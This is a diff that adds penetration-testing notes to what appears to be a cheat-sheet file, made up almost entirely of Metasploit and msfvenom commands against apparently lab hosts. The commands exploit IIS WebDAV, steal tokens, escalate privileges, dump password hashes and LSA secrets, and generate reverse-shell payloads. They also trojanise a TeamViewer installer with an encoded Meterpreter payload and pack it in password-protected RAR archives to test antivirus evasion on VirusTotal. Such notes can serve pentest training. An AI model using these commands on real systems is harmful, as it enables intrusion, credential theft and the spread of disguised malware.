@@ -184,6 +184,85 @@ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
 msfconsole -q
 msf6 > load penttest
 
+msf6 > sessions
+msf6 > sessions -i 1
+msf6 > jobs -h
+msf6 > exploit -h
+msf6 > exploit -j
+msf6 > jobs -l
+
+meterpreter > help
+msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
+msf6 > hosts
+msf6 > services
+msf6 > search iis_webdav_upload_asp
+msf6 > use 0
+msf6 > show options
+mmsf6 > set RHOSTS 10.10.10.15
+msf6 > set LHOST tun0
+msf6 > run
+meterpreter > getuid
+meterpreter > ps
+meterpreter > steal_token <PID>
+meterpreter > steal_token 1836
+meterpreter > getuid
+meterpreter > shell
+meterpreter > bg
+msf6 > search local_exploit_suggester
+msf6 > use 0
+msf6 > show options
+use exploit/windows/local/ms15_051_client_copy_images
+msf6 > show options
+msf6 > set SESSION 1
+msf6 > set LHOST tun0
+msf6 > run
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
+
+# 12 lots of module code here
+msf6 > search nagios
+searchsploit nagios
+searchsploit -t Nagios3 --exclude=".py"
+ls /usr/share/metasploit-framework
+ls .msf4
+cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+msfconsole -m /usr/share/metasploit-framework/modules/
+msf6 > loadpath /user/share/metasploit-framework/modules/
+msf6 > reload_all
+msf6 > use exploit/unix/webapp/nagios3_command_injection
+msf6 > show options
+ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
+cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
+
+nmap -sV -T4 -p- 10.10.10.5
+ftp 10.10.10.5
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+msfconsole -q
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > show options
+    set LHOST 10.10.14.5
+    set LPORT 1337
+    run
+
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+ls
+msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+cat test.js
+msf-virustotal -k <API key> -f test.js 
+wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+rar a ~/test.rar -p ~/test.js
+ls
+mv test.rar test
+ls
+rar a test2.rar -p test
+
+mv test2.rar test2
+ls
+msf-virustotal -k <API key> -f test2.rar
+# 14 exploit coding example
 ```
 
 ```bash
